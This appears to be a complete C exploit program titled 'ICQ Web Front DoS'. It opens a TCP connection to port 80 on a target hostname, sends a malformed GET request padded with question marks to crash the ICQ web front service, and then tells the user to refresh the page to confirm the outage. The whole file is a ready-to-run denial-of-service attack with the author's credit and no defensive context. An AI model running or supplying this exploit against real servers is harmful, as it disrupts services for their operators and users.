/* ICQ Web Front DoS */

#include <sys/socket.h> 
#include <stdio.h> 
#include <netinet/in.h>
#include <netdb.h>

void main(int argc, char *argv[]) 
{ 
  int sock;
  struct in_addr addr; 
  struct sockaddr_in sin; 
  struct hostent *he; 
  unsigned long start; 
  unsigned long end; 
  unsigned long counter;  
  
  /* added extra ? to be on the safe side :) */
  char xploitstr1[50]="GET /?????????? HTTP/1.0 \n\n";
  
  
  printf("ICQ Web Front DoS - author: char0hlz/tPG\n");  
  printf("The Poor Gurus' Network [http://www.tpgn.net]\n");

  if (argc<2) 
  { 
    printf("usage: %s <hostname>\n", argv[0]); 
    exit(0); 
  } 
  if ((he=gethostbyname(argv[1])) == NULL) 
  { 
    herror("gethostbyname"); 
    exit(0); 
  }  
    start=inet_addr(argv[1]); 
    counter=ntohl(start); 
    sock=socket(AF_INET,SOCK_STREAM,0); 
    bcopy(he->h_addr,(char *)&sin.sin_addr, he->h_length); 
    sin.sin_family=AF_INET; 
    sin.sin_port=htons(80); 
    if (connect(sock,(struct sockaddr*)&sin,sizeof(sin))!=0) 
    { 
      perror("pr0blemz"); 
    } 
    send(sock,xploitstr1,strlen(xploitstr1),0);
    close(sock);
    
   printf("Done. Refresh the page to see if it worked.\n"); 
} 
